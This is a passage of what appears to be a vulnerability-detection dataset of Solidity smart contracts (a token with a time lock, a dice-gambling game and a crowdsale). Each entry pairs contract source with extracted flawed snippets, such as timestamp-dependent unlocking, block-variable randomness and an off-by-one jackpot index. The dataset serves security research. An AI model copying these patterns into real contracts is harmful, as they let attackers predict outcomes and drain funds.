  "content": "pragma solidity ^0.4.18;\ncontract Ownable {\n address public owner;\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n}\ncontract ISStop is Ownable {\n bool public stopped;\n modifier stoppable {\n assert (!stopped);\n _;\n }\n function stop() public onlyOwner {\n stopped = true;\n }\n function start() public onlyOwner {\n stopped = false;\n }\n}\ncontract ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return balances[_owner];\n }\n}\ncontract StandardToken is BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed[_owner][_spender];\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract InseeCoin is ISStop, StandardToken{\n string public name = \"Insee Coin\";\n uint8 public decimals = 18;\n string public symbol = \"SEE\";\n string public version = \"v0.1\";\n uint256 public initialAmount = (10 ** 10) * (10 ** 18);\n event Destroy(address from, uint value);\n function InseeCoin() public {\n balances[msg.sender] = initialAmount;\n totalSupply_ = initialAmount;\n }\n function transfer(address dst, uint wad) public stoppable returns (bool) {\n return super.transfer(dst, wad);\n }\n function transferFrom(address src, address dst, uint wad) public stoppable returns (bool) {\n return super.transferFrom(src, dst, wad);\n }\n function approve(address guy, uint wad) public stoppable returns (bool) {\n return super.approve(guy, wad);\n }\n function destroy(uint256 _amount) external onlyOwner stoppable returns (bool success){\n require(balances[msg.sender] >= _amount);\n balances[msg.sender] = balances[msg.sender].sub(_amount);\n totalSupply_ = totalSupply_.sub(_amount);\n emit Destroy(msg.sender, _amount);\n return true;\n }\n function setName(string name_) public onlyOwner{\n name = name_;\n }\n}\ncontract TokenLock {\n using SafeMath for uint256;\n InseeCoin public ISC;\n uint256 private nextLockID = 0;\n mapping (uint256 => TokenTimeLockInfo) public locks;\n struct TokenTimeLockInfo {\n address beneficiary;\n uint256 amount;\n uint256 unlockTime;\n }\n event Lock (uint256 indexed id, address indexed beneficiary,uint256 amount, uint256 lockTime);\n event Unlock (uint256 indexed id, address indexed beneficiary,uint256 amount, uint256 unlockTime);\n function TokenLock(InseeCoin isc) public {\n assert(address(isc) != address(0));\n ISC = isc;\n }\n function lock (\n address _beneficiary, uint256 _amount,\n uint256 _lockTime) public returns (uint256) {\n require (_amount > 0);\n require (_lockTime > 0);\n nextLockID = nextLockID.add(1);\n uint256 id = nextLockID;\n TokenTimeLockInfo storage lockInfo = locks [id];\n require (lockInfo.beneficiary == 0x0);\n require (lockInfo.amount == 0);\n require (lockInfo.unlockTime == 0);\n lockInfo.beneficiary = _beneficiary;\n lockInfo.amount = _amount;\n lockInfo.unlockTime = now.add(_lockTime);\n emit Lock (id, _beneficiary, _amount, _lockTime);\n require (ISC.transferFrom (msg.sender, this, _amount));\n return id;\n }\n function unlock (uint256 _id) public {\n TokenTimeLockInfo memory lockInfo = locks [_id];\n delete locks [_id];\n require (lockInfo.amount > 0);\n require (lockInfo.unlockTime <= block.timestamp);\n emit Unlock (_id, lockInfo.beneficiary, lockInfo.amount, lockInfo.unlockTime);\n require (\n ISC.transfer (\n lockInfo.beneficiary, lockInfo.amount));\n }\n}",
  "extract_feature": [
    "function unlock (uint256 _id) public {\nTokenTimeLockInfo memory lockInfo = locks [_id];\ndelete locks [_id];\nrequire (lockInfo.amount > 0);\nrequire (lockInfo.unlockTime <= block.timestamp);\nemit Unlock (_id, lockInfo.beneficiary, lockInfo.amount, lockInfo.unlockTime);\nrequire (\nISC.transfer (\nlockInfo.beneficiary, lockInfo.amount));\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa8fa0e1460cdfa1ed8"
  },
  "filename": "10915.sol",
  "content": "pragma solidity ^0.4.23;\ncontract SafeMath {\n function safeToAdd(uint a, uint b) pure internal returns (bool) {\n return (a + b >= a);\n }\n function safeAdd(uint a, uint b) pure internal returns (uint) {\n require(safeToAdd(a, b));\n return a + b;\n }\n function safeToSubtract(uint a, uint b) pure internal returns (bool) {\n return (b <= a);\n }\n function safeSub(uint a, uint b) pure internal returns (uint) {\n require(safeToSubtract(a, b));\n return a - b;\n }\n}\ncontract DiceRoll is SafeMath {\n address public owner;\n uint8 constant public maxNumber = 99;\n uint8 constant public minNumber = 1;\n bool public gamePaused;\n bool public recommendPaused;\n bool public jackpotPaused;\n uint256 public contractBalance;\n uint16 public houseEdge;\n uint256 public maxProfit;\n uint16 public maxProfitAsPercentOfHouse;\n uint256 public minBet;\n uint256 public maxBet;\n uint16 public jackpotOfHouseEdge;\n uint256 public minJackpotBet;\n uint256 public recommendProportion;\n uint256 playerProfit;\n uint256 public jackpotBlance;\n address[] public jackpotPlayer;\n uint256 public JackpotPeriods = 1;\n uint64 public nextJackpotTime;\n uint16 public jackpotPersent = 100;\n uint256 public totalWeiWon;\n uint256 public totalWeiWagered;\n uint256 public betId;\n uint256 seed;\n modifier betIsValid(uint256 _betSize, uint8 _start, uint8 _end) {\n require(_betSize >= minBet && _betSize <= maxBet && _start >= minNumber && _end <= maxNumber);\n _;\n }\n modifier oddEvenBetIsValid(uint256 _betSize, uint8 _oddeven) {\n require(_betSize >= minBet && _betSize <= maxBet && (_oddeven == 1 || _oddeven == 0));\n _;\n }\n modifier gameIsActive {\n require(!gamePaused);\n _;\n }\n modifier recommendAreActive {\n require(!recommendPaused);\n _;\n }\n modifier jackpotAreActive {\n require(!jackpotPaused);\n _;\n }\n modifier onlyOwner {\n require(msg.sender == owner);\n _;\n }\n event LogResult(uint256 indexed BetID, address indexed PlayerAddress, uint8 DiceResult, uint256 Value, uint8 Status, uint8 Start, uint8 End, uint8 oddeven, uint256 BetValue);\n event LogJackpot(uint indexed BetID, address indexed PlayerAddress, uint jackpotValue);\n event LogRecommendProfit(uint indexed BetID, address indexed PlayerAddress, uint Profit);\n event LogOwnerTransfer(address SentToAddress, uint AmountTransferred);\n event SendJackpotSuccesss(address indexed winner, uint256 amount, uint256 JackpotPeriods);\n function() public payable{\n contractBalance = safeAdd(contractBalance, msg.value);\n setMaxProfit();\n }\n constructor() public {\n owner = msg.sender;\n houseEdge = 20;\n maxProfitAsPercentOfHouse = 100;\n minBet = 0.1 ether;\n maxBet = 1 ether;\n jackpotOfHouseEdge = 500;\n recommendProportion = 100;\n minJackpotBet = 0.1 ether;\n jackpotPersent = 100;\n }\n function playerRoll(uint8 start, uint8 end, address inviter) public payable gameIsActive betIsValid(msg.value, start, end) {\n betId += 1;\n uint8 probability = end - start + 1;\n playerProfit = ((msg.value * (100 - probability) / probability + msg.value) * (1000 - houseEdge) / 1000) - msg.value;\n if(playerProfit > maxProfit) playerProfit = maxProfit;\n uint8 random = uint8(rand() % 100 + 1);\n totalWeiWagered += msg.value;\n if(start <= random && random <= end){\n totalWeiWon = safeAdd(totalWeiWon, playerProfit);\n contractBalance = safeSub(contractBalance, playerProfit);\n uint256 payout = safeAdd(playerProfit, msg.value);\n setMaxProfit();\n emit LogResult(betId, msg.sender, random, playerProfit, 1, start, end, 2, msg.value);\n uint256 houseEdgeFee = getHouseEdgeFee(probability, msg.value);\n increaseJackpot(houseEdgeFee * jackpotOfHouseEdge / 1000, betId);\n if(inviter != address(0)){\n emit LogRecommendProfit(betId, msg.sender, playerProfit);\n sendProportion(inviter, houseEdgeFee * recommendProportion / 1000);\n }\n msg.sender.transfer(payout);\n return;\n }else{\n emit LogResult(betId, msg.sender, random, 0, 0, start, end, 2, msg.value);\n contractBalance = safeAdd(contractBalance, (msg.value-1));\n setMaxProfit();\n msg.sender.transfer(1);\n return;\n }\n }\n function oddEven(uint8 oddeven, address inviter) public payable gameIsActive oddEvenBetIsValid(msg.value, oddeven) {\n betId += 1;\n uint8 probability = 50;\n playerProfit = ((msg.value * (100 - probability) / probability + msg.value) * (1000 - houseEdge) / 1000) - msg.value;\n if(playerProfit > maxProfit) playerProfit = maxProfit;\n uint8 random = uint8(rand() % 100 + 1);\n totalWeiWagered += msg.value;\n if(random % 2 == oddeven){\n totalWeiWon = safeAdd(totalWeiWon, playerProfit);\n contractBalance = safeSub(contractBalance, playerProfit);\n uint256 payout = safeAdd(playerProfit, msg.value);\n setMaxProfit();\n emit LogResult(betId, msg.sender, random, playerProfit, 1, 0, 0, oddeven, msg.value);\n uint256 houseEdgeFee = getHouseEdgeFee(probability, msg.value);\n increaseJackpot(houseEdgeFee * jackpotOfHouseEdge / 1000, betId);\n if(inviter != address(0)){\n emit LogRecommendProfit(betId, msg.sender, playerProfit);\n sendProportion(inviter, houseEdgeFee * recommendProportion / 1000);\n }\n msg.sender.transfer(payout);\n return;\n }else{\n emit LogResult(betId, msg.sender, random, 0, 0, 0, 0, oddeven, msg.value);\n contractBalance = safeAdd(contractBalance, (msg.value-1));\n setMaxProfit();\n msg.sender.transfer(1);\n return;\n }\n }\n function sendProportion(address inviter, uint256 amount) internal {\n require(amount < contractBalance);\n contractBalance = safeSub(contractBalance, amount);\n inviter.transfer(amount);\n }\n function increaseJackpot(uint256 increaseAmount, uint256 _betId) internal {\n require(increaseAmount < maxProfit);\n emit LogJackpot(_betId, msg.sender, increaseAmount);\n jackpotBlance = safeAdd(jackpotBlance, increaseAmount);\n contractBalance = safeSub(contractBalance, increaseAmount);\n if(msg.value >= minJackpotBet){\n jackpotPlayer.push(msg.sender);\n }\n }\n function createWinner() public onlyOwner jackpotAreActive {\n uint64 tmNow = uint64(block.timestamp);\n require(tmNow >= nextJackpotTime);\n require(jackpotPlayer.length > 0);\n nextJackpotTime = tmNow + 72000;\n JackpotPeriods += 1;\n uint random = rand() % jackpotPlayer.length;\n address winner = jackpotPlayer[random - 1];\n jackpotPlayer.length = 0;\n sendJackpot(winner);\n }\n function sendJackpot(address winner) public onlyOwner jackpotAreActive {\n uint256 amount = jackpotBlance * jackpotPersent / 1000;\n require(jackpotBlance > amount);\n emit SendJackpotSuccesss(winner, amount, JackpotPeriods);\n jackpotBlance = safeSub(jackpotBlance, amount);\n winner.transfer(amount);\n }\n function sendValueToJackpot() payable public jackpotAreActive {\n jackpotBlance = safeAdd(jackpotBlance, msg.value);\n }\n function getHouseEdgeFee(uint256 _probability, uint256 _betValue) view internal returns (uint256){\n return (_betValue * (100 - _probability) / _probability + _betValue) * houseEdge / 1000;\n }\n function rand() internal returns (uint256) {\n seed = uint256(keccak256(msg.sender, blockhash(block.number - 1), block.coinbase, block.difficulty));\n return seed;\n }\n function setMaxProfit() internal {\n maxProfit = contractBalance * maxProfitAsPercentOfHouse / 1000;\n }\n function ownerSetHouseEdge(uint16 newHouseEdge) public onlyOwner{\n require(newHouseEdge <= 1000);\n houseEdge = newHouseEdge;\n }\n function ownerSetMinJackpoBet(uint256 newVal) public onlyOwner{\n require(newVal <= 1 ether);\n minJackpotBet = newVal;\n }\n function ownerSetMaxProfitAsPercentOfHouse(uint8 newMaxProfitAsPercent) public onlyOwner{\n require(newMaxProfitAsPercent <= 1000);\n maxProfitAsPercentOfHouse = newMaxProfitAsPercent;\n setMaxProfit();\n }\n function ownerSetMinBet(uint256 newMinimumBet) public onlyOwner{\n minBet = newMinimumBet;\n }\n function ownerSetMaxBet(uint256 newMaxBet) public onlyOwner{\n maxBet = newMaxBet;\n }\n function ownerSetJackpotOfHouseEdge(uint16 newProportion) public onlyOwner{\n require(newProportion < 1000);\n jackpotOfHouseEdge = newProportion;\n }\n function ownerSetRecommendProportion(uint16 newRecommendProportion) public onlyOwner{\n require(newRecommendProportion < 1000);\n recommendProportion = newRecommendProportion;\n }\n function ownerPauseGame(bool newStatus) public onlyOwner{\n gamePaused = newStatus;\n }\n function ownerPauseJackpot(bool newStatus) public onlyOwner{\n jackpotPaused = newStatus;\n }\n function ownerPauseRecommend(bool newStatus) public onlyOwner{\n recommendPaused = newStatus;\n }\n function ownerTransferEther(address sendTo, uint256 amount) public onlyOwner{\n contractBalance = safeSub(contractBalance, amount);\n sendTo.transfer(amount);\n setMaxProfit();\n emit LogOwnerTransfer(sendTo, amount);\n }\n function ownerChangeOwner(address newOwner) public onlyOwner{\n owner = newOwner;\n }\n function ownerkill() public onlyOwner{\n selfdestruct(owner);\n }\n}",
  "extract_feature": [
    "function createWinner() public onlyOwner jackpotAreActive {\nuint64 tmNow = uint64(block.timestamp);\nrequire(tmNow >= nextJackpotTime);\nrequire(jackpotPlayer.length > 0);\nnextJackpotTime = tmNow + 72000;\nJackpotPeriods += 1;\nuint random = rand() % jackpotPlayer.length;\naddress winner = jackpotPlayer[random - 1];\njackpotPlayer.length = 0;\nsendJackpot(winner);\n}",
    "function rand() internal returns (uint256) {\nseed = uint256(keccak256(msg.sender, blockhash(block.number - 1), block.coinbase, block.difficulty));\nreturn seed;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa8fa0e1460cdfa1ed9"
  },
  "filename": "10931.sol",
  "content": "pragma solidity ^0.4.13;\ncontract FinalizeAgent {\n function isFinalizeAgent() public constant returns(bool) {\n return true;\n }\n function isSane() public constant returns (bool);\n function finalizeCrowdsale();\n}\ncontract PricingStrategy {\n function isPricingStrategy() public constant returns (bool) {\n return true;\n }\n function isSane(address crowdsale) public constant returns (bool) {\n return true;\n }\n function isPresalePurchase(address purchaser) public constant returns (bool) {\n return false;\n }\n function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);\n}\nlibrary SafeMathLib {\n function times(uint a, uint b) returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function minus(uint a, uint b) returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function plus(uint a, uint b) returns (uint) {\n uint c = a + b;\n assert(c>=a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract Recoverable is Ownable {\n function Recoverable() {\n }\n function recoverTokens(ERC20Basic token) onlyOwner public {\n token.transfer(owner, tokensToBeReturned(token));\n }\n function tokensToBeReturned(ERC20Basic token) public returns (uint) {\n return token.balanceOf(this);\n }\n}\ncontract Haltable is Ownable {\n bool public halted;\n modifier stopInEmergency {\n if (halted) throw;\n _;\n }\n modifier stopNonOwnersInEmergency {\n if (halted && msg.sender != owner) throw;\n _;\n }\n modifier onlyInEmergency {\n if (!halted) throw;\n _;\n }\n function halt() external onlyOwner {\n halted = true;\n }\n function unhalt() external onlyOwner onlyInEmergency {\n halted = false;\n }\n}\ncontract Whitelist is Ownable {\n mapping(address => bool) public whitelist;\n event WhitelistedAddressAdded(address addr);\n event WhitelistedAddressRemoved(address addr);\n modifier onlyWhitelisted() {\n require(whitelist[msg.sender]);\n _;\n }\n function addAddressToWhitelist(address addr) onlyOwner public returns(bool success) {\n if (!whitelist[addr]) {\n whitelist[addr] = true;\n WhitelistedAddressAdded(addr);\n success = true;\n }\n }\n function addAddressesToWhitelist(address[] addrs) onlyOwner public returns(bool success) {\n for (uint256 i = 0; i < addrs.length; i++) {\n if (addAddressToWhitelist(addrs[i])) {\n success = true;\n }\n }\n }\n function removeAddressFromWhitelist(address addr) onlyOwner public returns(bool success) {\n if (whitelist[addr]) {\n whitelist[addr] = false;\n WhitelistedAddressRemoved(addr);\n success = true;\n }\n }\n function removeAddressesFromWhitelist(address[] addrs) onlyOwner public returns(bool success) {\n for (uint256 i = 0; i < addrs.length; i++) {\n if (removeAddressFromWhitelist(addrs[i])) {\n success = true;\n }\n }\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract FractionalERC20 is ERC20 {\n uint public decimals;\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return balances[_owner];\n }\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed[_owner][_spender];\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract CrowdsaleBase is Haltable, Whitelist {\n uint public MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE = 5;\n using SafeMathLib for uint;\n FractionalERC20 public token;\n PricingStrategy public pricingStrategy;\n FinalizeAgent public finalizeAgent;\n address public multisigWallet;\n uint public minimumFundingGoal;\n uint public startsAt;\n uint public endsAt;\n uint public tokensSold = 0;\n uint public weiRaised = 0;\n uint public presaleWeiRaised = 0;\n uint public investorCount = 0;\n uint public loadedRefund = 0;\n uint public weiRefunded = 0;\n bool public finalized;\n mapping (address => uint256) public investedAmountOf;\n mapping (address => uint256) public tokenAmountOf;\n mapping (address => bool) public earlyParticipantWhitelist;\n uint public ownerTestValue;\n enum State{Unknown, Preparing, PreFunding, Funding, Success, Failure, Finalized, Refunding}\n event Invested(address investor, uint weiAmount, uint tokenAmount, uint128 customerId);\n event Refund(address investor, uint weiAmount);\n event InvestmentPolicyChanged(bool newRequireCustomerId, bool newRequiredSignedAddress, address newSignerAddress);\n event Whitelisted(address addr, bool status);\n event EndsAtChanged(uint newEndsAt);\n function CrowdsaleBase(address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal) {\n owner = msg.sender;\n token = FractionalERC20(_token);\n setPricingStrategy(_pricingStrategy);\n multisigWallet = _multisigWallet;\n if(multisigWallet == 0) {\n throw;\n }\n if(_start == 0) {\n throw;\n }\n startsAt = _start;\n if(_end == 0) {\n throw;\n }\n endsAt = _end;\n if(startsAt >= endsAt) {\n throw;\n }\n minimumFundingGoal = _minimumFundingGoal;\n }\n function investInternal(address receiver, uint128 customerId) stopInEmergency internal returns(uint tokensBought) {\n Whitelist dc;\n address contract_addr = 0x062e41d1037745dc203e8c1AAcA651B8d157Da96;\n dc = Whitelist(contract_addr);\n require (dc.whitelist(msg.sender));\n require (dc.whitelist(receiver));\n if(getState() == State.PreFunding) {\n if(!earlyParticipantWhitelist[receiver]) {\n throw;\n }\n } else if(getState() == State.Funding) {\n } else {\n throw;\n }\n uint weiAmount = msg.value;\n require(weiAmount >= minimumFundingGoal);\n uint tokenAmount = pricingStrategy.calculatePrice(weiAmount, weiRaised - presaleWeiRaised, tokensSold, msg.sender, token.decimals());\n require(tokenAmount != 0);\n if(investedAmountOf[receiver] == 0) {\n investorCount++;\n }\n investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\n tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\n weiRaised = weiRaised.plus(weiAmount);\n tokensSold = tokensSold.plus(tokenAmount);\n if(pricingStrategy.isPresalePurchase(receiver)) {\n presaleWeiRaised = presaleWeiRaised.plus(weiAmount);\n }\n require(!isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold));\n assignTokens(receiver, tokenAmount);\n if(!multisigWallet.send(weiAmount)) throw;\n Invested(receiver, weiAmount, tokenAmount, customerId);\n return tokenAmount;\n }\n function finalize() public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != 0) {\n finalizeAgent.finalizeCrowdsale();\n }\n finalized = true;\n }\n function setFinalizeAgent(FinalizeAgent addr) onlyOwner {\n finalizeAgent = addr;\n if(!finalizeAgent.isFinalizeAgent()) {\n throw;\n }\n }\n function setEndsAt(uint time) onlyOwner {\n if(now > time) {\n throw;\n }\n if(startsAt > time) {\n throw;\n }\n endsAt = time;\n EndsAtChanged(endsAt);\n }\n function setPricingStrategy(PricingStrategy _pricingStrategy) onlyOwner {\n pricingStrategy = _pricingStrategy;\n if(!pricingStrategy.isPricingStrategy()) {\n throw;\n }\n }\n function setMultisig(address addr) public onlyOwner {\n if(investorCount > MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE) {\n throw;\n }\n multisigWallet = addr;\n }\n function loadRefund() public payable inState(State.Failure) {\n if(msg.value == 0) throw;\n loadedRefund = loadedRefund.plus(msg.value);\n }\n function refund() public inState(State.Refunding) {\n uint256 weiValue = investedAmountOf[msg.sender];\n if (weiValue == 0) throw;\n investedAmountOf[msg.sender] = 0;\n weiRefunded = weiRefunded.plus(weiValue);\n Refund(msg.sender, weiValue);\n if (!msg.sender.send(weiValue)) throw;\n }\n function isMinimumGoalReached() public constant returns (bool reached) {\n return weiRaised >= minimumFundingGoal;\n }\n function isFinalizerSane() public constant returns (bool sane) {\n return finalizeAgent.isSane();\n }\n function isPricingSane() public constant returns (bool sane) {\n return pricingStrategy.isSane(address(this));\n }\n function getState() public constant returns (State) {\n if(finalized) return State.Finalized;\n else if (address(finalizeAgent) == 0) return State.Preparing;\n else if (!finalizeAgent.isSane()) return State.Preparing;\n else if (!pricingStrategy.isSane(address(this))) return State.Preparing;\n else if (block.timestamp < startsAt) return State.PreFunding;\n else if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\n else if (isMinimumGoalReached()) return State.Success;\n else if (!isMinimumGoalReached() && weiRaised > 0 && loadedRefund >= weiRaised) return State.Refunding;\n else return State.Failure;\n }\n function setOwnerTestValue(uint val) onlyOwner {\n ownerTestValue = val;\n }\n function setEarlyParicipantWhitelist(address addr, bool status) onlyOwner {\n earlyParticipantWhitelist[addr] = status;\n Whitelisted(addr, status);\n }\n function isCrowdsale() public constant returns (bool) {\n return true;\n }\n modifier inState(State state) {\n if(getState() != state) throw;\n _;\n }\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) constant returns (bool limitBroken);\n function isCrowdsaleFull() public constant returns (bool);\n function assignTokens(address receiver, uint tokenAmount) internal;\n}\ncontract Crowdsale is CrowdsaleBase {\n bool public requireCustomerId;\n bool public requiredSignedAddress;\n address public signerAddress;\n function Crowdsale(address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal) CrowdsaleBase(_token, _pricingStrategy, _multisigWallet, _start, _end, _minimumFundingGoal) {\n }\n function preallocate(address receiver, uint fullTokens, uint weiPrice) public onlyOwner {\n uint tokenAmount = fullTokens * 10**token.decimals();\n uint weiAmount = weiPrice * fullTokens;\n weiRaised = weiRaised.plus(weiAmount);\n tokensSold = tokensSold.plus(tokenAmount);\n investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\n tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\n assignTokens(receiver, tokenAmount);\n Invested(receiver, weiAmount, tokenAmount, 0);\n }\n function investWithSignedAddress(address addr, uint128 customerId, uint8 v, bytes32 r, bytes32 s) public payable {\n bytes32 hash = sha256(addr);\n if (ecrecover(hash, v, r, s) != signerAddress) throw;\n if(customerId == 0) throw;\n investInternal(addr, customerId);\n }\n function investWithCustomerId(address addr, uint128 customerId) public payable {\n if(requiredSignedAddress) throw;\n if(customerId == 0) throw;\n investInternal(addr, customerId);\n }\n function invest(address addr) public payable {\n if(requireCustomerId) throw;\n if(requiredSignedAddress) throw;\n investInternal(addr, 0);\n }\n function buyWithSignedAddress(uint128 customerId, uint8 v, bytes32 r, bytes32 s) public payable {\n investWithSignedAddress(msg.sender, customerId, v, r, s);\n }\n function buyWithCustomerIdWithChecksum(uint128 customerId, bytes1 checksum) public payable {\n if (bytes1(sha3(customerId)) != checksum) throw;\n investWithCustomerId(msg.sender, customerId);\n }\n function buyWithCustomerId(uint128 customerId) public payable {\n investWithCustomerId(msg.sender, customerId);\n }\n function buy() public payable {\n invest(msg.sender);\n }\n function setRequireCustomerId(bool value) onlyOwner {\n requireCustomerId = value;\n InvestmentPolicyChanged(requireCustomerId, requiredSignedAddress, signerAddress);\n }\n function setRequireSignedAddress(bool value, address _signerAddress) onlyOwner {\n requiredSignedAddress = value;\n signerAddress = _signerAddress;\n InvestmentPolicyChanged(requireCustomerId, requiredSignedAddress, signerAddress);\n }\n function () public payable {\n invest(msg.sender);\n }\n}\ncontract MintedTokenCappedCrowdsale is Crowdsale {\n uint public maximumSellableTokens;\n function MintedTokenCappedCrowdsale(address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal, uint _maximumSellableTokens) Crowdsale(_token, _pricingStrategy, _multisigWallet, _start, _end, _minimumFundingGoal) {\n maximumSellableTokens = _maximumSellableTokens;\n }\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) constant returns (bool limitBroken) {\n return tokensSoldTotal > maximumSellableTokens;\n }\n function isCrowdsaleFull() public constant returns (bool) {\n return tokensSold >= maximumSellableTokens;\n }\n function assignTokens(address receiver, uint tokenAmount) internal {\n MintableToken mintableToken = MintableToken(token);\n mintableToken.mint(receiver, tokenAmount);\n }\n}\ncontract ERC827 is ERC20 {\n function approve( address _spender, uint256 _value, bytes _data ) public returns (bool);\n function transfer( address _to, uint256 _value, bytes _data ) public returns (bool);\n function transferFrom( address _from, address _to, uint256 _value, bytes _data ) public returns (bool);\n}\ncontract ERC827Token is ERC827, StandardToken {\n function approve(address _spender, uint256 _value, 